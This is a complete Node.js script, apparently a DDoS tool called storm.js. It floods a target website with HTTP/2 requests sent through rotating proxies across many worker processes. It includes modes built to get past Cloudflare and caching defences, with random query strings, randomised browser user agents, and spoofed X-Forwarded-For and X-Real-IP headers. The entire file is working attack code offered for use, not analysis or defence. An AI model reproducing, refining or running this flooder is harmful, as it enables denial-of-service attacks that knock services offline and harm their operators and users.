const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
  console.log(`node storm.js [target] [time] [rate] [thread] [proxy] [mode]`);
  console.log(`modes: default, geo-adapt, cloudflare`);
  console.log(`optional: --path ( for cache bypass ) --delay=ms ( for bypass known sources )`);
  process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
  return arr[(Math.random() * arr.length) | 0];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function parseDelay() {
    const delayArg = process.argv.find(arg => arg.startsWith('--delay='));
    if (delayArg) {
        const delayValue = parseInt(delayArg.split('=')[1]);
        return isNaN(delayValue) ? 0 : delayValue;
    }
    return 0;
}

// Generate legitimate-looking IP from various ASNs/countries
function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.8." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." }
    ];
    
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    mode: process.argv[7] || 'default',
    pathFlag: process.argv.includes('--path'),
    delay: parseDelay()
};

var proxies = readLines(args.proxyFile);
const parsedTarget = new URL(args.target);

// Proxy rotation management
let proxyList = [...proxies];
let usedProxies = new Set();
let activeProxies = 0;
const maxConcurrentProxies = Math.min(proxies.length, args.threads * 2);

// Proxy rotation for geo-adapt and cloudflare modes
if (['geo-adapt', 'cloudflare'].includes(args.mode)) {
    setInterval(() => {
        if (proxyList.length > 0) {
            proxyList.forEach((proxy) => {
                activeProxies--;
                proxyList = proxyList.filter(p => p !== proxy);
                usedProxies.delete(proxy);
            });
            for (let i = 0; i < maxConcurrentProxies; i++) {
                startProxy();
            }
        }
    }, 1500);
}

function startProxy() {
    if (proxyList.length === 0) {
        proxyList = [...proxies].filter(p => !usedProxies.has(p));
        if (proxyList.length === 0) {
            proxyList = [...proxies];
            usedProxies.clear();
        }
    }
    const proxy = proxyList.shift();
    usedProxies.add(proxy);
    activeProxies++;
    runFlooder(proxy);
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    if (['geo-adapt', 'cloudflare'].includes(args.mode)) {
        for (let i = 0; i < maxConcurrentProxies; i++) {
            startProxy();
        }
    } else {
        setInterval(runFlooder, 0);
    }
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();
const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = ["en-US","en-GB","en","de","fr","es","pt-BR","it","ru","ja","nl","pl","ko","tr","sv","au"];
const useragents = [
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/22B91 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
];

function buildHeaders() {
    let rand_path;
    if (args.pathFlag) {
        const rand_query = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        rand_path = (parsedTarget.pathname || "/") + rand_query;
    } else {
        rand_path = parsedTarget.pathname || "/";
    }
    
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":path": rand_path,
        ":authority": parsedTarget.host,
        "sec-fetch-dest": "document",
        "user-agent": randomElement(useragents),
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-mode": "navigate",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br"
    };
    
    // Add X-Forwarded-For with legit IP for cloudflare mode
    if (args.mode === 'cloudflare') {
        headers["x-forwarded-for"] = generateLegitIP();
        headers["x-real-ip"] = generateLegitIP();
    }
    
    return headers;
}

function runFlooder(specificProxy) {
    const proxyAddr = specificProxy || randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };
    
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            activeProxies--;
            return;
        }
        
        connection.setKeepAlive(true, 600000);
        
        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA",
            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:ecdsa_sha1:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512:rsa_pkcs1_sha1",
            ecdhCurve: 'X25519:prime256v1:secp384r1:secp521r1',
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };
        
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 4096,
                maxConcurrentStreams: 100,
                initialWindowSize: 2097152,
                maxHeaderListSize: 10240,
                enablePush: false,
            },
            createConnection: () => tlsConn
        });
        
        client.on("connect", () => {
            if (args.delay > 0) {
                setInterval(() => {
                    const request = client.request(buildHeaders(), {
                        parent: randomIntn(100, 9999),
                        exclusive: Math.random() > 0.5
                    });
                    request.close();
                }, args.delay);
            } else {
                setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(buildHeaders(), {
                            parent: randomIntn(100, 9999),
                            exclusive: Math.random() > 0.5
                        });
                        request.close();
                    }
                }, 1000);
            }
        });
        
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            activeProxies--;
        });
        
        client.on("error", () => {
            client.destroy();
            connection.destroy();
            activeProxies--;
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);